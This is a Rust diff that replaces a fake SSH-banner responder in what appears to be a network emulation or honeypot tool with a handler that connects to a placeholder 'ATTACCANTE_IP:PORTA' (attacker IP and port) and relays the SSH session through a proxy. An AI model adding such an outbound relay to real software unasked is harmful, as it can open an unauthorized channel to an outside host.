@@ -1,33 +1,13 @@
-use std::net::Ipv4Addr;
+use pnet::datalink::DataLinkSender;
+use tokio::net::TcpStream;
+use crate::proxy::ssh::start_ssh_proxy;
 
-use pnet::{datalink::DataLinkSender, packet::{tcp::{TcpFlags, TcpPacket}, Packet}, util::MacAddr};
-use tracing::error;
-
-use crate::network::sender::send_tcp_syn_ack;
-
-pub fn handle_ssh_connection(
+pub async fn handle_ssh_connection(
     tx: &mut dyn DataLinkSender,
-    tcp_received_packet: TcpPacket,
-    virtual_mac: MacAddr,
-    virtual_ip: Ipv4Addr,
-    source_ip: Ipv4Addr,
-    source_mac: MacAddr
 ){
-    println!("TCP PAYLOAD: {:?}", tcp_received_packet.payload());
+    let local_stream = TcpStream::connect("ATTACCANTE_IP:PORTA").await.expect("Failed creating local stream proxy");
 
-    let response_flags = TcpFlags::ACK | TcpFlags::PSH;
-    let banner = b"SSH-2.0-OpenSSH_8.6\r\n";
-    send_tcp_syn_ack(
-        &mut *tx, 
-        virtual_mac, 
-        virtual_ip, 
-        source_mac, 
-        source_ip, 
-        tcp_received_packet.get_destination(), 
-        tcp_received_packet,
-        response_flags,
-        banner
-        );
+    let _ = start_ssh_proxy(local_stream).await;
 
     return;
 }
